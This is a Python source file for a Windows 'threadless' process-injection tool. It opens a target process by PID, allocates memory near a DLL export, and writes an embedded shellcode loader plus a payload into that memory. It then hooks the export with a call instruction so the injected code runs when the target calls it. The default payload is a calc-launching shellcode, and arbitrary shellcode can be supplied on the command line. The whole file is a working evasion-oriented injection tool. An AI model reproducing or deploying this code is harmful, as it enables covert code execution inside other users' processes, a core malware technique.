import io
import sys
import time
import ctypes
import logging
import ctypes.wintypes
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

VmRead = 0x0010
VmWrite = 0x0020
VmOperation = 0x0008
MemCommit = 0x00001000
MemReserve = 0x00002000
MemRelease = 0x00008000
PageExecuteRead = 0x20
PageExecuteReadWrite = 0x40
PageReadWrite = 0x04

ShellcodeLoader = b"\x58\x48\x83\xe8\x05\x50\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x48\xb9\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\x08\x48\x83\xec\x40\xe8\x11\x00\x00\x00\x48\x83\xc4\x40\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x58\xff\xe0\x90"
CalcX64 = b"\x53\x56\x57\x55\x54\x58\x66\x83\xE4\xF0\x50\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x29\xD4\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x68\x5C\x5D\x5F\x5E\x5B\xC3"

kernel32.LoadLibraryA.restype = ctypes.wintypes.HMODULE
kernel32.LoadLibraryA.argtypes = [
    ctypes.wintypes.LPCSTR
]
kernel32.GetModuleHandleA.restype = ctypes.wintypes.HMODULE
kernel32.GetModuleHandleA.argtypes = [
    ctypes.wintypes.LPCSTR
]

kernel32.GetProcAddress.restype = ctypes.wintypes.HMODULE
kernel32.GetProcAddress.argtypes = [
    ctypes.wintypes.HMODULE,
    ctypes.wintypes.LPCSTR
]

kernel32.CloseHandle.restype = ctypes.wintypes.HMODULE
kernel32.CloseHandle.argtypes = [
    ctypes.wintypes.HANDLE
]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ('Length', ctypes.wintypes.USHORT),
        ('MaximumLength', ctypes.wintypes.USHORT),
        ('Buffer', ctypes.wintypes.LPWSTR),
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('Length', ctypes.wintypes.ULONG),
        ('RootDirectory', ctypes.wintypes.HANDLE),
        ('ObjectName', UNICODE_STRING),
        ('Attributes', ctypes.wintypes.ULONG)
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", ctypes.wintypes.HANDLE),
        ("UniqueThread", ctypes.wintypes.HANDLE)
    ]

ntdll.NtOpenProcess.restype = ctypes.wintypes.HANDLE
ntdll.NtOpenProcess.argtypes = [
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.wintypes.ULONG,
    ctypes.POINTER(OBJECT_ATTRIBUTES),
    ctypes.POINTER(CLIENT_ID)
]

ntdll.NtAllocateVirtualMemory.restype = ctypes.wintypes.HANDLE
ntdll.NtAllocateVirtualMemory.argtypes = [
    ctypes.wintypes.HANDLE,
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.wintypes.HANDLE,
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.wintypes.ULONG,
    ctypes.wintypes.ULONG,
]

ntdll.NtProtectVirtualMemory.restype = ctypes.wintypes.HANDLE
ntdll.NtProtectVirtualMemory.argtypes = [
    ctypes.wintypes.HANDLE,
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.wintypes.ULONG,
    ctypes.POINTER(ctypes.wintypes.ULONG)
]

ntdll.NtWriteVirtualMemory.restype = ctypes.wintypes.HANDLE
ntdll.NtWriteVirtualMemory.argtypes = [
    ctypes.wintypes.HANDLE,
    ctypes.wintypes.HANDLE,
    ctypes.c_void_p,
    ctypes.c_uint32,
    ctypes.POINTER(ctypes.c_uint32)
]

ntdll.NtReadVirtualMemory.restype = ctypes.wintypes.HANDLE
ntdll.NtReadVirtualMemory.argtypes = [
    ctypes.wintypes.HANDLE,
    ctypes.wintypes.HANDLE,
    ctypes.c_void_p,
    ctypes.c_uint32,
    ctypes.POINTER(ctypes.c_uint32)
]

ntdll.NtFreeVirtualMemory.restype = ctypes.wintypes.HANDLE
ntdll.NtFreeVirtualMemory.argtypes = [
    ctypes.wintypes.HANDLE,
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.POINTER(ctypes.wintypes.HANDLE),
    ctypes.wintypes.ULONG
]

def OpenProcess(pid: int, processHandle: ctypes.wintypes.HANDLE) -> int:
    oa = OBJECT_ATTRIBUTES()
    oa.Length = ctypes.sizeof(oa)
    cid = CLIENT_ID()
    cid.UniqueProcess = pid
    return ntdll.NtOpenProcess(
        ctypes.byref(processHandle),
        VmRead | VmWrite | VmOperation,
        ctypes.byref(oa),
        ctypes.byref(cid)
    )

def AllocateVirtualMemory(processHandle: ctypes.wintypes.HANDLE, address: int, size: int):
    return ntdll.NtAllocateVirtualMemory(
        processHandle,
        ctypes.byref(ctypes.c_void_p(address)),
        ctypes.wintypes.HANDLE(0),
        ctypes.byref(ctypes.c_void_p(size)),
        MemCommit | MemReserve,
        PageExecuteRead
    )

def LoadShellcode(shellcodeStr=CalcX64):
    if shellcodeStr is CalcX64:
        logging.warning("[=] No shellcode supplied, using calc shellcode")
    return shellcodeStr

def FindMemoryHole(processHandle, exportAddress, size):
    remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000
    foundMemory = False
    while remoteLoaderAddress < (exportAddress + 0x70000000):
        status = AllocateVirtualMemory(
            processHandle, 
            remoteLoaderAddress, 
            size)
        if not status:
            foundMemory = True
            break
        remoteLoaderAddress += 0x10000
    return remoteLoaderAddress if foundMemory else 0

def GenerateHook(originalInstructions: bytes):
    writer = io.BytesIO(ShellcodeLoader)
    writer.seek(0x12)
    writer.write(originalInstructions)
    writer.seek(0)
    return writer.read()

def ProtectVirtualMemory(processHandle: int, address: int, size: int, newProtection, oldProtection):
    return ntdll.NtProtectVirtualMemory(
        processHandle,
        ctypes.byref(ctypes.wintypes.HANDLE(address)),
        ctypes.byref(ctypes.wintypes.HANDLE(size)),
        newProtection,
        ctypes.byref(oldProtection)
    )

def WriteVirtualMemory(processHandle: int, address: int, buffer: bytes, bytesWritten: int):
    status = ntdll.NtWriteVirtualMemory(
        processHandle,
        ctypes.wintypes.HANDLE(address),
        buffer,
        ctypes.c_uint32(len(buffer)),
        ctypes.byref(bytesWritten)
    )

def ReadVirtualMemory(processHandle: int, address: int, buffer: bytes, bytesToRead: int, bytesRead):
    status = ntdll.NtReadVirtualMemory(
        processHandle,
        ctypes.wintypes.HANDLE(address),
        buffer,
        ctypes.c_uint32(bytesToRead),
        ctypes.byref(bytesRead)
    )

def FreeVirtualMemory(processHandle: int, address: int):
    regionSize = ctypes.wintypes.HANDLE(0)
    return ntdll.NtFreeVirtualMemory(
        processHandle,
        ctypes.byref(ctypes.wintypes.HANDLE(address)),
        ctypes.byref(regionSize),
        MemRelease
    )

def CloseHandle(processHandle: int):
    return kernel32.CloseHandle(
        processHandle
    )

def threadlessInject(module: bytes, export: bytes, pid: int, waitTime: int=60, shellcodeBytes: bytes=None):
    global ShellcodeLoader
    dllHandle = kernel32.GetModuleHandleA(module)
    if not dllHandle:
        dllHandle = kernel32.LoadLibraryA(module)

    if not dllHandle:
        raise OSError(hex(dllHandle), f"[!] Failed to open handle to DLL {module.decode()}, is the KnownDll loaded?")

    exportAddress = kernel32.GetProcAddress(dllHandle, export) #(handle, exported func name)

    if not exportAddress:
        raise OSError(exportAddress.decode(), f"[!] Failed to find export {export.decode()} in {module.decode()}, are you sure it's correct?")

    logging.info(f"[=] Found {module.decode()}!{export.decode()} @ {hex(exportAddress)}")

    processHandle = ctypes.wintypes.HANDLE(0)

    result = OpenProcess(pid, processHandle) #pid
    if result or not processHandle.value:
        raise OSError(hex(result), f"[!] Failed to open PID {pid}: {hex(exportAddress)}")

    logging.info(f"[=] Opened process with id {pid}")

    if shellcodeBytes:
        shellcode = LoadShellcode(shellcodeStr=shellcodeBytes)
    else:
        shellcode = LoadShellcode()

    loaderAddress = FindMemoryHole(
        processHandle,
        exportAddress,
        len(ShellcodeLoader) + len(shellcode)
    )

    if not loaderAddress:
        raise OSError(hex(loaderAddress), "[!] Failed to find a memory hole with 2G of export address, bailing")

    logging.info(f"[=] Allocated loader and shellcode at {hex(loaderAddress)} within PID {pid}")

    originalBytes = ctypes.string_at(exportAddress, 8)

    ShellcodeLoader = GenerateHook(originalBytes)

    oldProtect = ctypes.wintypes.ULONG()

    ProtectVirtualMemory(
        processHandle,
        exportAddress,
        8,
        PageExecuteReadWrite,
        oldProtect
    )

    relativeLoaderAddress = loaderAddress - (ctypes.wintypes.ULONG(exportAddress).value + 5)

    callOpCode = b"\xe8\x00\x00\x00\x00"

    callOpCodeStream = io.BytesIO(callOpCode)
    callOpCodeStream.seek(1)
    callOpCodeStream.write(relativeLoaderAddress.to_bytes(8, byteorder=sys.byteorder))
    callOpCodeStream.seek(0)
    callOpCode = callOpCodeStream.read()

    bytesWritten = ctypes.c_uint32(0)

    status = WriteVirtualMemory(
        processHandle,
        exportAddress,
        callOpCode,
        bytesWritten
    )

    if (status or bytesWritten.value != len(callOpCode)):
        raise OSError(hex(status), f"[!] Failed to write callOpCode: {hex(status)}")

    payload = ShellcodeLoader + shellcode

    status = ProtectVirtualMemory(
        processHandle,
        loaderAddress,
        len(payload),
        PageReadWrite,
        oldProtect
    )

    if status:
        raise OSError(hex(loaderAddress), f"[!] Failed to unprotect {hex(loaderAddress)}")

    status = WriteVirtualMemory(
        processHandle,
        loaderAddress,
        payload,
        bytesWritten
    )

    if status:
        raise OSError(hex(status), f"[!] Failed to write payload: {hex(status)}")

    purgeProtect = ctypes.wintypes.ULONG()

    status = ProtectVirtualMemory(
        processHandle,
        loaderAddress,
        len(payload),
        oldProtect,
        purgeProtect
    )

    if status:
        raise OSError(hex(loaderAddress), f"[!] Failed to protect {hex(loaderAddress)}")

    waitCounter = 0
    wait = int(waitTime)    

    logging.info(f"[+] Shellcode injected, Waiting 60s for the hook to be called")
    buffer = (ctypes.c_ubyte*8)(0)#b"\x00\x00\x00\x00\x00\x00\x00\x00"

    executed = False

    while waitCounter < wait:
        bytesToRead = 8
        bytesRead = ctypes.c_uint32(0)

        ReadVirtualMemory(
            processHandle,
            exportAddress,
            buffer,
            bytesToRead,
            bytesRead
        )
        if originalBytes == bytes(buffer):
            executed = True
            break
        time.sleep(1)
        waitCounter += 1

    if executed:
        status = ProtectVirtualMemory(
            processHandle,
            exportAddress,
            8,
            oldProtect,
            purgeProtect
        )

        if status:
            logging.warning(f"[!] Failed to protect {hex(loaderAddress)}")

        status = FreeVirtualMemory(
            processHandle,
            loaderAddress
        )

        if status:
            logging.warning(f"[!] Failed to release {hex(loaderAddress)}: {hex(status)}")

        logging.info(f"[+] Shellcode executed after {waitCounter}s, export restored")
    else:
        logging.warning(f"[!] Shellcode did not trigger within {waitCounter}s, it may still execute but we are not cleaning up")

    status = CloseHandle(processHandle)

    if not status:
        raise OSError(hex(status), f"[!] Failed to close handle of {processHandle.value}")
    
    exit()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='Perform threadless process injection')
    parser.add_argument('--dll', '-d', dest='module', type=str, required=True,
                    help='The DLL that that contains the export to patch (must be KnownDll)')
    parser.add_argument('--export', '-e', dest='export', type=str, required=True,
                    help='The exported function that will be hijacked')
    parser.add_argument('--pid', '-p', dest='pid', type=int, required=True,
                    help='Target process ID to inject')
    parser.add_argument('--wait', '-w', dest='waitTime', type=int, required=False, default=60,
                    help='Time to wait for execution before cleanup will be abandoned')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--raw', '-r', dest='raw', type=str, required=False,
                    help='Base64 for x64 shellcode payload (default: calc launcher)')
    group.add_argument('--file', '-f', dest='file', type=str, required=False,
                    help='file for x64 shellcode payload (default: calc launcher)')
    args = parser.parse_args()
    if args.raw or args.file:
        if args.raw:
            import base64
            shellcode = base64.b64decode(args.raw)
        elif args.file:
            import os
            if os.path.exists(args.file):
                shellcode = open(args.file, 'rb').read()
            else:
                raise FileNotFoundError
        threadlessInject(args.module.encode(), args.export.encode(), args.pid, waitTime=args.waitTime, shellcodeBytes=shellcode)
    else:
        threadlessInject(args.module.encode(), args.export.encode(), args.pid, waitTime=args.waitTime)
    
